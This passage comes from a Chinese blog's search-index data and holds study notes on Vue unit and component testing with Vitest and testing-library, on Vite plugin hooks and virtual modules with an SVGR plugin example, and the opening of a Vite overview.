increment 函数并断言它是否返回了所期望的内容，所以我们将编写一个单元测试。 如果任何一条断言失败了，那么问题一定是出在 increment 函数上。 // helpers.spec.js import { increment } from './helpers' describe('increment', () =&gt; { test('increments the current number by 1', () =&gt; { expect(increment(0, 10)).toBe(1) }) test('does not increment the current number over the max', () =&gt; { expect(increment(10, 10)).toBe(10) }) test('has a default max of 10', () =&gt; { expect(increment(10)).toBe(10) }) }) 如前所述，单元测试通常适用于独立的业务逻辑、组件、类、模块或函数，不涉及 UI 渲染、网络请求或其他环境问题。 这些通常是与 Vue 无关的纯 JavaScript/TypeScript 模块。一般来说，在 Vue 应用中为业务逻辑编写单元测试与使用其他框架的应用没有明显区别。但有两种情况，必须对 Vue 的特定功能进行单元测试： 组合式函数 组件 组合式函数单元测试 有一类 Vue 应用中特有的函数被称为 组合式函数，在测试过程中可能需要特殊处理。 当涉及到测试组合式函数时，我们可以根据是否依赖宿主组件实例把它们分为两类。当一个组合式函数使用以下 API 时，它依赖于一个宿主组件实例： 生命周期钩子 供给/注入 如果一个组合式程序只使用响应式 API，那么它可以通过直接调用并断言其返回的状态或方法来进行测试。 counter.js // counter.js import { ref } from 'vue' export function useCounter() { const count = ref(0) const increment = () =&gt; count.value++ return { count, increment } } counter.test.js // counter.test.js import { useCounter } from './counter.js' test('useCounter', () =&gt; { const { count, increment } = useCounter() expect(count.value).toBe(0) increment() expect(count.value).toBe(1) }) 一个依赖生命周期钩子或供给/注入的组合式函数需要被包装在一个宿主组件中才可以测试。我们可以创建下面这样的帮助函数： test-utils.js // test-utils.js import { createApp } from 'vue' export function withSetup(composable) { let result const app = createApp({ setup() { result = composable() // 忽略模板警告 return () =&gt; {} } }) app.mount(document.createElement('div')) // 返回结果与应用实例 // 用来测试供给和组件卸载 return [result, app] } foo.test.js import { withSetup } from './test-utils' import { useFoo } from './foo' test('useFoo', () =&gt; { const [result, app] = withSetup(() =&gt; useFoo(123)) // 为注入的测试模拟一方供给 app.provide(...) // 执行断言 expect(result.foo.value).toBe(1) // 如果需要的话可以这样触发 app.unmount() }) 对于更复杂的组合式函数，通过使用组件测试编写针对这个包装器组件的测试，会容易很多。 组件的单元测试 一个组件可以通过两种方式测试： 白盒：单元测试 白盒测试知晓一个组件的实现细节和依赖关系。它们更专注于将组件进行更 独立 的测试。这些测试通常会涉及到模拟一些组件的部分子组件，以及设置插件的状态和依赖性（例如 Vuex）。 黑盒：组件测试 黑盒测试不知晓一个组件的实现细节。这些测试尽可能少地模拟，以测试组件在整个系统中的集成情况。它们通常会渲染所有子组件，因而会被认为更像一种“集成测试”。 推荐方案 因为由 create-vue 创建的官方项目配置是基于 Vite 的，所以我们推荐你使用一个可以利用同一套 Vite 配置和转换管道的单元测试框架。Vitest 正是一个针对此目标设计的单元测试框架，它由 Vue / Vite 团队成员开发和维护。 Peeky 是另一速度极快的单元测试运行器，对 Vite 集成提供第一优先级支持。它也是由 Vue 核心团队成员创建的，并提供了一个基于图形用户界面（GUI）的测试界面。 Jest 是一个广受欢迎的单元测试框架，并可通过 vite-jest 这个包在 Vite 中使用。不过，我们只推荐你在已有一套 Jest 测试配置、且需要迁移到基于 Vite 的项目时使用它，因为 Vitest 提供了更无缝的集成和更好的性能。 组件测试 在 Vue 应用中，主要用组件来构建用户界面。因此，当验证应用的行为时，组件是一个很自然的独立单元。从粒度的角度来看，组件测试位于单元测试之上，可以被认为是集成测试的一种形式。你的 Vue 应用中大部分内容都应该由组件测试来覆盖，我们建议每个 Vue 组件都应有自己的组件测试文件。 组件测试应该捕捉组件中的 prop、事件、提供的插槽、样式、CSS class 名、生命周期钩子等。 组件测试不应该模拟子组件，而应该像用户一样，通过与组件互动来测试组件和其子组件之间的交互。例如，组件测试应该像用户那样点击一个元素，而不是编程式地与组件进行交互。 组件测试主要需要关心组件的公开接口而不是内部实现细节。对于大部分的组件来说，公开接口包括触发的事件、prop 和插槽。当进行测试时，请记住，测试这个组件做了什么，而不是测试它是怎么做到的。 推荐的做法 对于 视图 的测试：根据输入 prop 和插槽断言渲染输出是否正确。 对于 交互 的测试：断言渲染的更新是否正确或触发的事件是否正确地响应了用户输入事件。 示例 一个步进器（Stepper）组件，它拥有一个标记为 increment 的可点击的 DOM 元素。我们还传入了一个名为 max 的 prop 防止步进器增长超过 2，因此如果我们点击了按钮 3 次，视图将仍然显示 2。 我们不了解这个步进器的实现细节，只知道“输入”是这个 max prop，“输出”是这个组件状态所呈现出的视图。 应避免的做法 不要去断言一个组件实例的私有状态或测试一个组件的私有方法。测试实现细节会使测试代码太脆弱，因为当实现发生变化时，它们更有可能失败并需要更新重写。 组件的最终工作是渲染正确的 DOM 输出，所以专注于 DOM 输出的测试提供了足够的正确性保证（如果你不需要更多其他方面测试的话），同时更加健壮、需要的改动更少。 不要完全依赖快照测试。断言 HTML 字符串并不能完全说明正确性。应当编写有意图的测试。 如果一个方法需要测试，把它提取到一个独立的实用函数中，并为它写一个专门的单元测试。如果它不能被直截了当地抽离出来，那么对它的调用应该作为交互测试的一部分。 推荐方案 Vitest 对于组件和组合式函数都采用无头渲染的方式 (例如 VueUse 中的 useFavicon 函数)。组件和 DOM 都可以通过 @testing-library/vue 来测试。 Cypress 组件测试 会预期其准确地渲染样式或者触发原生 DOM 事件。可以搭配 @testing-library/cypress 这个库一同进行测试。 @vue/test-utils 代码： const valueSelector = '[data-testid=stepper-value]' const buttonSelector = '[data-testid=increment]' const wrapper = mount(Stepper, { props: { max: 1 } }) expect(wrapper.find(valueSelector).text()).toContain('0') await wrapper.find(buttonSelector).trigger('click') expect(wrapper.find(valueSelector).text()).toContain('1') @testing-library/vue 代码： const { getByText } = render(Stepper, { props: { max: 1 } }) getByText('0') // 隐式断言 &quot;0&quot; 在这个组件中 const button = getByText('increment') // 向我们的增长按钮发送一个点击事件。 await fireEvent.click(button) getByText('1') await fireEvent.click(button) 组件挂载库 组件测试通常涉及到单独挂载被测试的组件，触发模拟的用户输入事件，并对渲染的 DOM 输出进行断言。有一些专门的工具库可以使这些任务变得更简单。 @testing-library/vue 是一个 Vue 的测试库，专注于测试组件而不依赖其他实现细节。因其良好的设计使得代码重构也变得非常容易。它的指导原则是，测试代码越接近软件的使用方式，它们就越值得信赖。 @vue/test-utils 是官方的底层组件测试库，用来提供给用户访问 Vue 特有的 API。@testing-library/vue 也是基于此库构建的。 推荐使用 @testing-library/vue 测试应用中的组件, 因为它更匹配整个应用的测试优先级。只有在你构建高级组件、并需要测试内部的 Vue 特有 API 时再使用 @vue/test-utils。 使用 安装，npm i -D vitest happy-dom @testing-library/vue。 配置，添加上 test 选项： // vite.config.js import { defineConfig } from 'vite' export default defineConfig({ // ... test: { // 启用类似 jest 的全局测试 API globals: true, // 使用 happy-dom 模拟 DOM // 这需要你安装 happy-dom 作为对等依赖（peer dependency） environment: 'happy-dom' } }) 如果使用 TypeScript，将 vitest/globals 添加到 tsconfig.json 的 types 字段当中。 { &quot;compilerOptions&quot;: { &quot;types&quot;: [&quot;vitest/globals&quot;] } } 创建名字以 *.test.js 结尾的文件。你可以把所有的测试文件放在项目根目录下的 test 目录中，或者放在源文件旁边的 test 目录中。Vitest 会使用命名规则自动搜索它们。 // MyComponent.test.js import { render } from '@testing-library/vue' import MyComponent from './MyComponent.vue' test('it should work', () =&gt; { const { getByText } = render(MyComponent, { props: { /* ... */ } }) // 断言输出 getByText('...') }) 在 package.json 之中添加测试命令，然后 npm test 运行它： { // ... &quot;scripts&quot;: { &quot;test&quot;: &quot;vitest&quot; } } ","link":"https://zkrisj.github.io/post/ce-shi-zhi-shi-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"Vite 插件开发 ｜ 青训营笔记","content":"Vite 简介 Vite 开箱即用的功能等价于： webpack webpack-dev-server css-loader style-loader less-loader sass-loader postcss-loader file-loader MiniCssExtractPlugin HTMLWebpackPlugin HMR 无需额外配置，自动开启 Tree Shaking 无需配置，默认开启 ... 使用插件 若要使用一个插件，需要将它添加到项目的 devDependencies 并在 vite.config.js 配置文件中的 plugins 数组中引入它。例如，要想为传统浏览器提供支持，可以按下面这样使用官方插件 @vitejs/plugin-legacy： npm add -D @vitejs/plugin-legacy // vite.config.js import legacy from '@vitejs/plugin-legacy' import { defineConfig } from 'vite' export default defineConfig({ plugins: [ legacy({ targets: ['defaults', 'not IE 11'], }), ], }) plugins 也可以接受将多个插件作为单个模块文件的预设。这对于使用多个插件实现的复杂特性（如框架集成）很有用。该数组将在内部被扁平化（flatten）。 // 框架插件 import frameworkRefresh from 'vite-plugin-framework-refresh' import frameworkDevtools from 'vite-plugin-framework-devtools' export default function framework(config) { return [frameworkRefresh(config), frameworkDevTools(config)] } // vite.config.js import { defineConfig } from 'vite' import framework from 'vite-plugin-framework' export default defineConfig({ plugins: [framework()] }) 插件排序 为了与某些 Rollup 插件兼容，可能需要强制修改插件的执行顺序，或者只在构建时使用。这应该是 Vite 插件的实现细节。可以使用 enforce 修饰符来强制插件的位置: Alias（路径别名）相关的插件 pre：在 Vite 核心插件之前调用该插件 Vite 核心插件 normal（默认）：在 Vite 核心插件之后调用该插件 Vite 生产环境构建用的插件 post：在 Vite 构建插件之后调用该插件 Vite 后置构建插件（压缩、manifest、报告） // vite.config.js import image from '@rollup/plugin-image' import { defineConfig } from 'vite' export default defineConfig({ plugins: [ { ...image(), enforce: 'pre' } ] }) 按需应用 默认情况下 Vite 插件同时被用于开发环境和生产环境，可以使用 apply 属性指明它们仅在 'build'（生产环境）或 'serve'（开发环境）时调用： // vite.config.js import typescript2 from 'rollup-plugin-typescript2' import { defineConfig } from 'vite' export default defineConfig({ plugins: [ { ...typescript2(), apply: 'build' } ] }) apply 属性还可以配置成一个函数，进行更灵活的控制： apply(config, { command }) { // 只用于非 SSR 情况下的生产环境构建 return command === 'build' &amp;&amp; !config.build.ssr } 开发插件 插件可以很好的扩展 vite 自身不能做到的事情，比如 文件图片的压缩、 对 commonjs 的支持、 打包进度条 等。 Vite 的插件机制是基于 Rollup 来设计的，Vite 和 Rollup 中具有相同的 Hook 如 resolveId、load、transform。 Vite 插件扩展了 Rollup 接口，带有一些 Vite 独有的配置项。因此，你只需要编写一个 Vite 插件，就可以同时为开发环境和生产环境工作。 当创作插件时，可以在 vite.config.js 中直接使用它，没必要直接为它创建一个新的 package。 Vite 插件应该有一个带 vite-plugin- 前缀、语义清晰的名称。如果只适用于特定的框架，它的名字应该遵循以下前缀格式： vite-plugin-vue- 前缀作为 Vue 插件 vite-plugin-react- 前缀作为 React 插件 vite-plugin-svelte- 前缀作为 Svelte 插件 Vite 插件与 Rollup 插件结构类似，是一个具有 name 属性和各种插件 Hook 的对象： { // 插件名称 name: 'vite-plugin-xxx', load(code) { // 钩子逻辑 }, } 一般情况下因为要考虑到外部传参，我们不会直接写一个对象，而是实现一个返回插件对象的工厂函数。 // myPlugin.js export function myVitePlugin(options) { return { name: 'vite-plugin-xxx', load(id) { // 在钩子逻辑中可以通过闭包访问外部的 options 传参 } } } // vite.config.ts import { myVitePlugin } from './myVitePlugin'; export default { plugins: [myVitePlugin({ /* 给插件传参 */ })] } Hook 通用 Hook Vite 在开发阶段会创建一个插件容器 Plugin Container 来调用 Rollup 构建钩子，这个钩子主要分为三个阶段: 服务器启动阶段: options 和 buildStart 钩子会在服务启动时被调用。 请求响应阶段: 当浏览器发起请求时，Vite 内部依次调用 resolveId、load 和 transform 钩子。 服务器关闭阶段: Vite 会依次执行 buildEnd 和 closeBundle 钩子。 除了以上钩子，其他 Rollup 插件钩子，例如 moduleParsed、renderChunk 均不会在 Vite 开发阶段调用，因为 Vite 为了性能会避免完整的 AST 解析。而在生产环境下 Vite 会直接使用 Rollup，所以 Vite 插件中所有 Rollup 的插件钩子都会生效。 构建阶段 options(options) ：在服务器启动时被调用：获取、操纵Rollup选项，严格意义上来讲，它执行于属于构建阶段之前； buildStart(options)：在每次开始构建时调用； resolveId(source, importer, options)：在每个传入模块请求时被调用，创建自定义确认函数，可以用来定位第三方依赖； load(id)：在每个传入模块请求时被调用，可以自定义加载器，可用来返回自定义的内容； transform(code, id)：在每个传入模块请求时被调用，主要是用来转换单个模块； buildEnd(error?: Error)：在构建阶段结束后被调用，此处构建结束只是代表所有模块转义完成； 输出阶段 outputOptions(options)：接受输出参数； renderStart(outputOptions, inputOptions)：每次 bundle.generate 和 bundle.write 调用时都会被触发； augmentChunkHash(chunkInfo)：用来给 chunk 增加 hash； renderChunk(code, chunk, options)：转译单个的chunk时触发。rollup 输出每一个chunk文件的时候都会调用； generateBundle(options, bundle, isWrite)：在调用 bundle.write 之前立即触发这个 hook； writeBundle(options, bundle)：在调用 bundle.write后，所有的chunk都写入文件后，最后会调用一次 writeBundle； closeBundle()：在服务器关闭时被调用。 Vite 独有 Hook Vite 中具有一些特有的 Hook，这些 Hook 只会在 Vite 内部调用，而放到 Rollup 中会被直接忽略。 config 类型： (config: UserConfig, env: { mode: string, command: string }) =&gt; UserConfig | null | void 种类： async, sequential Vite 在读取完配置文件 vite.config.ts 之后，会拿到用户导出的配置对象，然后执行 config 钩子。在这个钩子里面，你可以对配置文件导出的对象进行自定义的操作： // 返回部分配置（推荐） const editConfigPlugin = () =&gt; ({ name: 'vite-plugin-modify-config', config: () =&gt; ({ alias: { react: require.resolve('react') } }) }) 也可以通过钩子的入参拿到 config 对象进行自定义的修改： const mutateConfigPlugin = () =&gt; ({ name: 'mutate-config', // command 为 `serve`(开发环境) 或者 `build`(生产环境) config(config, { command }) { // 生产环境中修改 root 参数 if (command === 'build') { config.root = __dirname; } } }) 在一些比较深层的对象配置中，这种直接修改配置的方式会显得比较麻烦，如 optimizeDeps.esbuildOptions.plugins，需要写很多的样板代码： // 防止出现 undefined 的情况 config.optimizeDeps = config.optimizeDeps || {} config.optimizeDeps.esbuildOptions = config.optimizeDeps.esbuildOptions || {} config.optimizeDeps.esbuildOptions.plugins = config.optimizeDeps.esbuildOptions.plugins || [] 可以直接返回一个配置对象，这样会方便很多： config() { return { optimizeDeps: { esbuildOptions: { plugins: [] } } } } configResolved 类型： (config: ResolvedConfig) =&gt; void | Promise&lt;void&gt; 种类： async, parallel Vite 在解析完配置之后会调用 configResolved 钩子，这个钩子一般用来记录最终的配置信息，而不建议再修改配置。 const examplePlugin = () =&gt; { let config return { name: 'read-config', configResolved(resolvedConfig) { // 存储最终解析的配置 config = resolvedConfig }, // 在其他钩子中使用存储的配置 transform(code, id) { if (config.command === 'serve') { // dev: 由开发服务器调用的插件 } else { // build: 由 Rollup 调用的插件 } } } } 在开发环境下，command 的值为 serve（在 CLI 中，vite 和 vite dev 是 vite serve 的别名）。 configureServer 类型： (server: ViteDevServer) =&gt; (() =&gt; void) | void | Promise&lt;(() =&gt; void) | void&gt; 种类： async, sequential 这个钩子仅在开发阶段会被调用，在运行生产版本时不会被调用，用于扩展 Vite 的 Dev Server，最常见的用例是在内部 connect 应用程序中添加自定义中间件。 configureServer 钩子将在内部中间件被安装前调用，所以自定义的中间件将会默认会比内部中间件早运行。 如果你想注入一个在内部中间件 之后 运行的中间件，你可以从 configureServer 返回一个函数，将会在内部中间件安装后被调用。 const myPlugin = () =&gt; ({ name: 'configure-server', configureServer(server) { // 姿势 1: 在 Vite 内置中间件之前执行 server.middlewares.use((req, res, next) =&gt; { // 自定义请求处理... }) // 姿势 2: 在 Vite 内置中间件之后执行 // 返回一个在内部中间件安装后被调用的后置钩子 return () =&gt; { server.middlewares.use((req, res, next) =&gt; { // 自定义请求处理... }) } } }) 在某些情况下，其他插件钩子可能需要访问开发服务器实例（例如访问 websocket 服务器、文件系统监视程序或模块图）。这个钩子也可以用来存储服务器实例以供其他钩子访问。 const myPlugin = () =&gt; { let server return { name: 'configure-server', configureServer(_server) { server = _server }, transform(code, id) { if (server) { // 使用 server... } } } } configurePreviewServer 类型： (server: { middlewares: Connect.Server, httpServer: http.Server }) =&gt; (() =&gt; void) | void | Promise&lt;(() =&gt; void) | void&gt; 种类： async, sequential 与 configureServer 相同但是用于预览服务器。它提供了一个 connect 服务器实例及其底层的 httpServer。这个钩子也是在其他中间件安装前被调用的，如果你想要在其他中间件 之后 安装一个插件，你可以从 configurePreviewServer 返回一个函数，它将会在内部中间件被安装之后再调用： const myPlugin = () =&gt; ({ name: 'configure-preview-server', configurePreviewServer(server) { // 返回一个钩子，会在其他中间件安装完成后调用 return () =&gt; { server.middlewares.use((req, res, next) =&gt; { // 自定义处理请求 ... }) } } }) transformIndexHtml 类型： IndexHtmlTransformHook | { enforce?: 'pre' | 'post', transform: IndexHtmlTransformHook } 种类： async, sequential 转换 index.html 的专用钩子，可以拿到原始的 html 内容后进行任意的转换。这个钩子可以是异步的，并且可以返回以下其中之一: 经过转换的 HTML 字符串 注入到现有 HTML 中的标签描述符对象数组（{ tag, attrs, children }）。每个标签也可以指定它应该被注入到哪里（默认是在 &lt;head&gt; 之前） 一个包含 { html, tags } 的对象 const htmlPlugin = () =&gt; { return { name: 'html-transform', transformIndexHtml(html) { return html.replace( /&lt;title&gt;(.*?)&lt;\\/title&gt;/, `&lt;title&gt;Title replaced!&lt;/title&gt;` ) } } } 也可以返回如下的对象结构，一般用于添加某些标签。 const htmlPlugin = () =&gt; { return { name: 'html-transform', transformIndexHtml(html) { return { html, // 注入标签 tags: [{ // 放到 body 末尾，可取值还有`head`|`head-prepend`|`body-prepend`，顾名思义 injectTo: 'body', // 标签属性定义 attrs: { type: 'module', src: './index.ts' }, // 标签名 tag: 'script', }, ], } } } } handleHotUpdate 类型： (ctx: HmrContext) =&gt; Array&lt;ModuleNode&gt; | void | Promise&lt;Array&lt;ModuleNode&gt; | void&gt; 执行自定义 HMR 更新处理。 可以进行热更模块的过滤（过滤和缩小受影响的模块列表，使 HMR 更准确）； 也可以返回一个空数组，并通过向客户端发送自定义事件来执行完整的自定义 HMR 处理； handleHotUpdate({ server }) { server.ws.send({ type: 'custom', event: 'special-update', data: {} }) return [] } 或者进行自定义的热更处理。 钩子接收一个带有以下签名的上下文对象： interface HmrContext { file: string timestamp: number modules: Array&lt;ModuleNode&gt; read: () =&gt; string | Promise&lt;string&gt; server: ViteDevServer } modules 是受更改文件影响的模块数组。它是一个数组，因为单个文件可能映射到多个服务模块（例如 Vue 单文件组件）。 read 这是一个异步读函数，它返回文件的内容。之所以这样做，是因为在某些系统上，文件更改的回调函数可能会在编辑器完成文件更新之前过快地触发，这样 fs.readFile 会直接返回空内容。传入的 read 函数规范了这种行为。 const handleHmrPlugin = () =&gt; { return { async handleHotUpdate(ctx) { // 需要热更的文件 console.log(ctx.file) // 需要热更的模块，如一个 Vue 单文件会涉及多个模块 console.log(ctx.modules) // 时间戳 console.log(ctx.timestamp) // Vite Dev Server 实例 console.log(ctx.server) // 读取最新的文件内容 console.log(await read()) // 自行处理 HMR 事件 ctx.server.ws.send({ type: 'custom', event: 'special-update', data: { a: 1 } }) return [] } } } // 前端代码中加入 // 客户端代码应该使用 HMR API 注册相应的处理器（这应该被相同插件的 transform 钩子注入） if (import.meta.hot) { import.meta.hot.on('special-update', (data) =&gt; { // 执行自定义更新 // { a: 1 } console.log(data) window.location.reload(); }) } 插件 Hook 执行顺序 服务启动阶段: config、configResolved、options、configureServer、buildStart。 请求响应阶段: 如果是 HTML 文件，仅执行 transformIndexHtml 钩子；对于非 HTML 文件，则依次执行 resolveId、load 和 transform钩子。 热更新阶段: 执行 handleHotUpdate 钩子。 服务关闭阶段: 依次执行 buildEnd 和 closeBundle 钩子。 Rollup 插件兼容性 相当数量的 Rollup 插件将直接作为 Vite 插件工作（例如：@rollup/plugin-alias 或 @rollup/plugin-json），但并不是所有的，因为有些插件钩子在非构建式的开发服务器上下文中没有意义。 一般来说，只要 Rollup 插件符合以下标准，它就应该像 Vite 插件一样工作： 没有使用 moduleParsed 钩子。 它在打包钩子和输出钩子之间没有很强的耦合。 如果一个 Rollup 插件只在构建阶段有意义，则在 build.rollupOptions.plugins 下指定即可。它的工作原理与 Vite 插件的 enforce: 'post' 和 apply: 'build' 相同。 也可以用 Vite 独有的属性来扩展现有的 Rollup 插件： // vite.config.js import example from 'rollup-plugin-example' import { defineConfig } from 'vite' export default defineConfig({ plugins: [ { ...example(), enforce: 'post', apply: 'build' } ] }) 可以查看 Vite Rollup 插件 获取兼容的官方 Rollup 插件列表及其使用指南。 虚拟模块 作为构建工具，一般需要处理两种形式的模块，一种存在于真实的磁盘文件系统中，另一种并不在磁盘而在内存当中，也就是虚拟模块。通过虚拟模块，我们既可以把自己手写的一些代码字符串作为单独的模块内容，又可以将内存中某些经过计算得出的变量作为模块内容进行加载，非常灵活和方便。 虚拟模块是一种很实用的模式，使你可以对使用 ESM 语法的源文件传入一些编译时信息。 虚拟模块在 Vite（以及 Rollup）中都以 virtual: 为前缀，作为面向用户路径的一种约定。插件名应该被用作命名空间，以避免与生态系统中的其他插件发生冲突。例如，vite-plugin-posts 可以要求用户导入一个 virtual:posts 或者 virtual:posts/helpers 虚拟模块来获得编译时信息。 在内部，使用了虚拟模块的插件在解析时应该将模块 ID 加上前缀 \\0，这一约定来自 rollup 生态。这避免了其他插件尝试处理这个 ID（比如 node 解析），而例如 sourcemap 这些核心功能可以利用这一信息来区别虚拟模块和正常文件。\\0 在导入 URL 中不是一个被允许的字符，因此我们需要在导入分析时替换掉它们。一个虚拟 ID 为 \\0{id} 在浏览器中开发时，最终会被编码为 /@id/__x00__{id}。这个 id 会被解码回进入插件处理管线前的样子，因此这对插件钩子的代码是不可见的。 直接从真实文件派生出来的模块，就像单文件组件中的脚本模块（如.vue 或 .svelte SFC）不需要遵循这个约定。SFC 通常在处理时生成一组子模块，但这些模块中的代码可以映射回文件系统。对这些子模块使用 \\0 会使 sourcemap 无法正常工作。 export default function myPlugin() { const virtualModuleId = 'virtual:my-module' const resolvedVirtualModuleId = '\\0' + virtualModuleId return { name: 'my-plugin', // 必须的，将会在 warning 和 error 中显示 resolveId(id) { if (id === virtualModuleId) { return resolvedVirtualModuleId } }, load(id) { if (id === resolvedVirtualModuleId) { return `export const msg = &quot;from virtual module&quot;` } } } } 然后可以在 JavaScript 中引入这些模块，并获取它们返回的数据： import { msg } from 'virtual:my-module' console.log(msg); // &quot;from virtual module&quot; 可以看到，虚拟模块的内容完全能够被动态计算出来，因此它的灵活性和可定制程度非常高，实用性也很强，在 Vite 内部的插件被深度地使用，社区当中也有不少知名的插件(如 vite-plugin-windicss、vite-plugin-svg-icons 等)也使用了虚拟模块的技术。 示例 我们有时候希望能将 svg 当做一个组件来引入，这样我们可以很方便地修改 svg 的各种属性，相比于 img 标签的引入方式也更加优雅。但 Vite 本身并不支持将 svg 转换为组件的代码，需要我们通过插件来实现。 首先安装一下需要的依赖： pnpm i resolve @svgr/core -D 用户通过传入 defaultExport 可以控制 svg 资源的默认导出。 当 defaultExport 为 component，默认当做组件来使用： import Logo from './Logo.svg' // 在组件中直接使用 &lt;Logo /&gt; 当 defaultExports 为 url，默认当做 url 使用，如果需要用作组件，可以通过具名导入的方式来支持： import logoUrl, { ReactComponent as Logo } from './logo.svg'; // url 使用 &lt;img src={logoUrl} /&gt; // 组件方式使用 &lt;Logo /&gt; 在 plugins 目录新建 svgr.ts。我们的主要逻辑在 transform(code, id) 钩子中，完成转换单个模块。 根据 id 入参过滤出 svg 资源； 读取 svg 文件内容； 利用 @svgr/core 将 svg 转换为 React 组件代码; 处理默认导出为 url 的情况； 将组件的 jsx 代码转译为浏览器可运行的代码。 import { Plugin } from &quot;vite&quot;; import * as fs from &quot;fs&quot;; import * as resolve from &quot;resolve&quot;; interface SvgrOptions { defaultExport: &quot;url&quot; | &quot;component&quot;; } export default function viteSvgrPlugin(options: SvgrOptions): Plugin { const { defaultExport = &quot;component&quot; } = options; return { name: &quot;vite-plugin-svgr&quot;, async transform(code, id) { if (!id.endsWith(&quot;.svg&quot;)) { return code; } console.log(code); const svgrTransform = require(&quot;@svgr/core&quot;).transform; const esbuildPackagePath = resolve.sync(&quot;esbuild&quot;, { basedir: require.resolve(&quot;vite&quot;), }); const esbuild = require(esbuildPackagePath); const svg = await fs.promises.readFile(id, &quot;utf8&quot;); const svgrResult = await svgrTransform( svg, {}, { componentName: &quot;ReactComponent&quot; } ); let componentCode = svgrResult; if (defaultExport === &quot;url&quot;) { componentCode = svgrResult.replace( &quot;export default ReactComponent&quot;, &quot;export { ReactComponent }&quot; ); // 加上 Vite 默认的 `export default 资源路径` componentCode += code; } const result = await esbuild.transform(componentCode, { loader: &quot;jsx&quot;, }); return result.code; }, }; } 在项目中使用这个插件。 // vite.config.ts import svgr from './plugins/svgr'; // 返回的配置 { plugins: [ // 省略其它插件 svgr({ defaultExport: &quot;component&quot; }) ] } 在项目中用组件的方式引入 svg。 // App.tsx import Logo from './logo.svg' function App() { return ( &lt;&gt; &lt;Logo /&gt; &lt;/&gt; ) } export default App; 调试 另外，在开发调试插件的过程，可以装上 vite-plugin-inspect 插件。 // vite.config.ts import inspect from 'vite-plugin-inspect'; // 返回的配置 { plugins: [ // 省略其它插件 inspect() ] } 这样当再次启动项目时，会发现多出一个调试地址： 可以通过这个地址来查看项目中各个模块的编译结果： 通过这个面板，我们可以很清楚地看到相应模块经过插件处理后变成了什么样子，让插件的调试更加方便。 ","link":"https://zkrisj.github.io/post/vite-cha-jian-kai-fa-or-qing-xun-ying-bi-ji/"},{"title":"Vite 知识体系总结 ｜ 青训营笔记","content":"Vite 介绍 前端工程的痛点： 首先是前端的模块化需求。我们知道，业界的模块标准非常多，包括 ESM、CommonJS、AMD 和 CMD 等等。前端工程一方面需要落实这些模块规范，保证模块正常加载。另一方面需要兼容不同的模块规范，以适应不同的执行环境。 其次是兼容浏览器，编译高级语法。由于浏览器的实现规范所限，只要高级语言/语法（TypeScript、 JSX 等）想要在浏览器中正常运行，就必须被转化为浏览器可以理解的形式。这都需要工具链层面的支持，而且这个需求会一直存在。 再者是线上代码的质量问题。和开发阶段的考虑侧重点不同，生产环境中，我们不仅要考虑代码的安全性、兼容性问题，保证线上代码的正常运行，也需要考虑代码运行时的性能问题。由于浏览器的版本众多，代码兼容性和安全策略各不相同，线上代码的质量问题也将是前端工程中长期存在的一个痛点。 同时，开发效率也不容忽视。我们知道，项目的冷启动/二次启动时间、热更新时间都可能严重影响开发效率，尤其是当项目越来越庞大的时候。因此，提高项目的启动速度和热更新速度也是前端工程的重要需求。 那么，前端构建工具是如何解决以上问题的呢？ 模块化方面，提供模块加载方案，并兼容不同的模块规范。 语法转译方面，配合 Sass、TSC、Babel 等前端工具链，完成高级语法的转译功能，同时对于静态资源也能进行处理，使之能作为一个模块正常加载。 产物质量方面，在生产环境中，配合 Terser 等压缩工具进行代码压缩和混淆，通过 Tree Shaking 删除未使用的代码，提供对于低版本浏览器的语法降级处理等等。 开发效率方面，构建工具本身通过各种方式来进行性能优化，包括使用原生语言 Go/Rust、no-bundle 等思路，提高项目的启动性能和热更新的速度。 为什么 Vite 是当前最高效的构建工具？ 首先是开发效率。传统构建工具普遍的缺点就是太慢了，与之相比，Vite 能将项目的启动性能提升一个量级，并且达到毫秒级的瞬间热更新效果。就拿 Webpack 来说，一般的项目使用 Webpack 之后，启动花个几分钟都是很常见的事情，热更新也经常需要等待十秒以上。这主要是因为： webpack、Rollup、Parcel 开发服务器都会从我们的源代码和 node_modules 文件夹中把我们的整个代码库打包在一起，通过构建过程运行这些代码，比如 Babel、TypeScript 或 PostCSS，然后将打包的代码推送到我们的浏览器上。 Snowpack、Vite、wmr 开发服务器则不采用这种模式。相反，它们会等到浏览器找到一个 import 语句，并为模块发出 HTTP 请求，在这个请求发出后，该工具才会对请求的模块和模块导入树中的任何叶节点应用转换，然后将这些转换提供给浏览器。这大大加快了速度，因为在推送到开发服务器的过程中减少了工作。 Vite 在开发阶段基于浏览器原生 ESM 的支持实现了no-bundle 服务。另一方面，借助 Esbuild 超快的编译速度来做第三方库构建和 TS/JSX 语法编译，从而能够有效提高开发效率。 除了开发效率，在其他三个维度上， Vite 也表现不俗。 模块化方面，Vite 基于浏览器原生 ESM 的支持实现模块加载，并且无论是开发环境还是生产环境，都可以将其他格式的产物（如 CommonJS）转换为 ESM。 语法转译方面，Vite 内置了对 TypeScript、JSX、Sass 等高级语法的支持，也能够加载各种各样的静态资源，如图片、Worker 等等。 产物质量方面，Vite 基于成熟的打包工具 Rollup 实现生产环境打包，同时可以配合 Terser、Babel 等工具链，可以极大程度保证构建产物的质量。 ES6 Module ES6 Module 也被称作 ES Module（或 ESM）， 是由 ECMAScript 官方提出的模块化规范，作为一个官方提出的规范，ES Module 已经得到了现代浏览器的内置支持。 在现代浏览器中，如果在 HTML 中加入含有 type=&quot;module&quot; 属性的 script 标签，那么浏览器会按照 ES Module 规范来进行依赖加载和模块解析，这也是 Vite 在开发阶段实现 no-bundle 的原因，由于模块加载的任务交给了浏览器，即使不打包也可以顺利运行模块代码。 全球浏览器对原生 ESM 的普遍支持，目前占比 92% 以上。不仅如此，一直以 CommonJS 作为模块标准的 Node.js 也紧跟 ES Module 的发展步伐，从 12.20 版本开始正式支持原生 ES Module。也就是说，如今 ES Module 能够同时在浏览器与 Node.js 环境中执行，拥有天然的跨平台能力。 Esbuild 基于 Golang 开发的前端工具，具备如下能力： 打包器 Bundler 编译器 Transformer，性能极高（见上图对比测试），在 Vite 中被深度使用 压缩器 Minifier 功能简介 Vite 开箱即用的功能等价于： webpack webpack-dev-server css-loader style-loader less-loader sass-loader postcss-loader file-loader MiniCssExtractPlugin HTMLWebpackPlugin HMR 无需额外配置，自动开启 Tree Shaking 无需配置，默认开启 ... 例如，以下 webpack.config.js 配置文件： export default { entry: './src/index.ts', module: { rules: [ { test: /\\.[tj]sx?$/, use: [{ loader: 'babel-loader', options: { presets: ['@babel/preset-env', '@babel/preset-typescript'], } }] }, { test: 